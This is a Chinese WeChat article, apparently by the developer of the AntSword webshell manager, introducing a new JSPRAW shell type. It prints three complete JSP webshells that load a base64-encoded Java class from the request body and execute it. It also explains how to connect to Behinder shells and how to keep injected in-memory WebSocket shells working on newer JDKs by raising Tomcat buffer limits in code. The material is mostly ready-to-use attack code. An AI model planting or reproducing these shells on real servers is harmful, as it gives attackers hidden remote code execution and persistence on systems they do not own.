---
title: AntSword新增类型：JSPRAW的一些玩法
url: https://mp.weixin.qq.com/s?__biz=MzI0MDI5MTQ3OQ==&mid=2247484614&idx=1&sn=97d5a5e57753a30d6bfb16f32027b9b5&chksm=e91c5f3ede6bd6285ed1857dff9f1fadbcc99fd76464d998989c2ffc444be29a6a87d2ea3fca&scene=58&subscene=0#rd
source: 学蚁致用
date: 2024-09-24
fetch_date: 2025-10-06T18:27:53.315287
---

# AntSword新增类型：JSPRAW的一些玩法

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/LtiayO136fU485xoGfH8Hkhlptnb2T3TQMPtOlswXn7vmnCwWHkva1rDx6WIV2sic4mzYZdiaia6kY9ic8XZGYRR5FQ/0?wx_fmt=jpeg)

# AntSword新增类型：JSPRAW的一些玩法

学蚁致用

以下文章来源于网络安全回收站
，作者yzddMr6

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM7lnQiatoGfUyiaBIiagXZSooL35B2HNkTeJ9esqcX89mLNg/0)

**网络安全回收站**
.

这里是yzddmr6的公众号，博客的移动端版本，经常研究一些奇奇怪怪的东西。

## 背景

最近给AntSword新增了一种类型：JSPRAW，主要有以下两点改进：

* JSPRAW不再使用其他参数进行传参，同时支持key-value键值对以及raw传参形式
* 新增toString触发方式，Payload可以不用依赖外部request/response对象，兼容非HTTP场景

接下来以几个实际场景讲讲这个新类型有哪些应用。

## 具体应用

### 一键连接冰蝎的JSP Shell

JSPRAW支持如下Shell写法，类似冰蝎，直接发送RAW格式的Payload。

需要注意的是这时候设置密码是不生效的，随便填即可，另外需要在设置里勾选 其他设置-Body设置为RAW模式。如果不勾选的话就是键值对传参形式，可以兼容原来的Shell写法。

```
1. <%!
2. class U extends ClassLoader {
3. U(ClassLoader c) {
4. super(c);
5. }
6. public Class g(byte[] b) {
7. return super.defineClass(b, 0, b.length);
8. }
9. }

11. public byte[] base64Decode(String str) throws Exception {
12. try {
13. Class clazz = Class.forName("sun.misc.BASE64Decoder");
14. return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
15. } catch (Exception e) {
16. Class clazz = Class.forName("java.util.Base64");
17. Object decoder = clazz.getMethod("getDecoder").invoke(null);
18. return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
19. }
20. }
21. %>
22. <%
23. String cls = request.getReader().readLine();
24. if (cls != null) {
25. new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response});
26. }
27. %>
```

此时传递的Payload形式如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQlxTZLJlUM9gEIib7VL43ia94gOO4jfEuibeiadvC9d1cfjrxSBicqETToyA/640?wx_fmt=png&from=appmsg)

既然已经是冰蝎的传参形式了，那么我们只要配合特定的编码器，就可以直接连接冰蝎的Shell了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQxAGMjvlYticCCSxlAzia3ia23bvzIfqzRMv4fIlRwlNlIPh4Khy66Ikiag/640?wx_fmt=png&from=appmsg)

设置里需要勾选 Body设置为RAW模式

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQfKaokMpN2q63Zwia6SKkHZxxck7QSs55W2lS1HmWoz9CiaGYemobGB8g/640?wx_fmt=png&from=appmsg)

正常连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQJ9WOBjC8j0cuQRia1xqmZmjgTakp2E7rOoJib2lwK1d9CQndglxIJluw/640?wx_fmt=png&from=appmsg)

抓包可以看到，蚁剑也同样实现了冰蝎的强加密能力。一个Shell，两种用法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQYR5smjYuOnqesHRErQnExqGTYia4iaMjV0SbypNnlFIarIHKN6Qmej6w/640?wx_fmt=png&from=appmsg)

可以再单独写一个解码器对回显包进行二次编码，这里就不再展开

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQicXdecfib8M68yqia5NmxoA9sY0yeYyJatZDGbmXsxIuXcP80PWanIlCQ/640?wx_fmt=png&from=appmsg)

### 兼容非HTTP场景

在实战中我们会遇到一些非HTTP的情况，例如WebSocket内存马，WebFlux内存马，表达式注入等。因此JSPRAW做了一些改进，以兼容这类利用场景。

在Payload中增加了一个toString的调用入口，可以把执行的回显信息保存到一个字符串里并且return

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQ0LGsJ3c1ucUjhWD0RLLbqFrTDQct7uu0uhR1p1G6U4lODohw0dVAsw/640?wx_fmt=png&from=appmsg)

只调用toString的Shell样例如下：

```
1. <%!
2. class U extends ClassLoader {
3. U(ClassLoader c) {
4. super(c);
5. }
6. public Class g(byte[] b) {
7. return super.defineClass(b, 0, b.length);
8. }
9. }

11. public byte[] base64Decode(String str) throws Exception {
12. try {
13. Class clazz = Class.forName("sun.misc.BASE64Decoder");
14. return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
15. } catch (Exception e) {
16. Class clazz = Class.forName("java.util.Base64");
17. Object decoder = clazz.getMethod("getDecoder").invoke(null);
18. return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
19. }
20. }
21. %>
22. <%
23. String cls = request.getReader().readLine();
24. if (cls != null) {
25. out.print(new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance());
26. }
27. %>
```

正常连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQ0Z4Pibu9Dicb4melvOhOoTB26J1q3as8icbRFOgdVoEO51xMCdX62Zvibg/640?wx_fmt=png&from=appmsg)

并且equals跟toString可以同时使用，equals拿到request对象后，还可以同时通过toString获取回显。

这样的写法主要是可以兼容一些漏洞利用场景，不需要每次额外去做判断。不理解的小伙伴多写几个利用EXP就明白我什么意思了。

```
1. <%!
2. class U extends ClassLoader {
3. U(ClassLoader c) {
4. super(c);
5. }
6. public Class g(byte[] b) {
7. return super.defineClass(b, 0, b.length);
8. }
9. }

11. public byte[] base64Decode(String str) throws Exception {
12. try {
13. Class clazz = Class.forName("sun.misc.BASE64Decoder");
14. return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
15. } catch (Exception e) {
16. Class clazz = Class.forName("java.util.Base64");
17. Object decoder = clazz.getMethod("getDecoder").invoke(null);
18. return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
19. }
20. }
21. %>
22. <%
23. String cls = request.getReader().readLine();
24. if (cls != null) {
25. Object obj = new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance();
26. obj.equals(new Object[]{request,response});
27. out.print(obj.toString());
28. }
29. %>
```

正常连接

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQqgaTZnBXbJATVILgS7um76G8NhuM89pqhmm89UXZdT6s8WOAdWkpAQ/640?wx_fmt=png&from=appmsg)

### 高版本JDK下的WebSocket内存马

这里举一个例子：高版本JDK下如何连接WebSocket内存马

背景是蚁剑很早就支持了WebSocket类型的内存马，在JDK<=14的时候可以用Js引擎来实现WebSocket内存马的连接Payload，但是从JDK15开始Js引擎被移除，就无法再使用了。

现在有了JSPRAW之后，WebSocket内存马就不存在高版本JDK的兼容性问题了，可以一直支持到最新的JDK22。

测试的时候还遇到了一个小坑，注入WS内存马以后连接发现只能执行第一个包，后面的包都没有回复。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQSeeyfmqyM3VODicPs6auGtNZPcvS0DdcIDu6n2Bbnasfoe2RvGUpaIw/640?wx_fmt=png&from=appmsg)

debug了一番发现原因是Tomcat中WebSocke 发送信息默认长度为8kb，而后续的Payload超过了这个大小。

正常的做法是修改web.xml调大这个参数

```
1. <context-param>
2. <param-name>org.apache.tomcat.websocket.textBufferSize</param-name>
3. <param-value>5242800</param-value>
4. </context-param>
```

当然我们不可能去修改web.xml了，代码里找一下在哪里调用的，修改掉就好了

```
1. ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
2. container.setDefaultMaxTextMessageBufferSize(52428800); // 设置为50m
3. container.setDefaultMaxBinaryMessageBufferSize(52428800);
```

这样就可以正常连接了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/LtiayO136fU485xoGfH8Hkhlptnb2T3TQwfH9M5X8BAk8W3exNicZt3veyqvSHSajhoOdNszJcLtqv4ybJcHSicag/640?wx_fmt=png&from=appmsg)

## 最后

代码已经同步到github：https://github.com/AntSwordProject/AntSword-JSP-Template/tree/jspraw

实战是检验真理的唯一标准，你还有什么建议或者新的玩法呢？欢迎一起讨论:)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/lkcJVly3Wy3ytGm27ah7wlPApLRroRWib2zJKLIndcRAicqDPT3cM2z2fTjI2iakFNoqqe8NmrTyoibYSfMImZo0Fg/0?wx_fmt=png)

学蚁致用

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/lkcJVly3Wy3ytGm27ah7wlPApLRroRWib2zJKLIndcRAicqDPT3cM2z2fTjI2iakFNoqqe8NmrTyoibYSfMImZo0Fg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过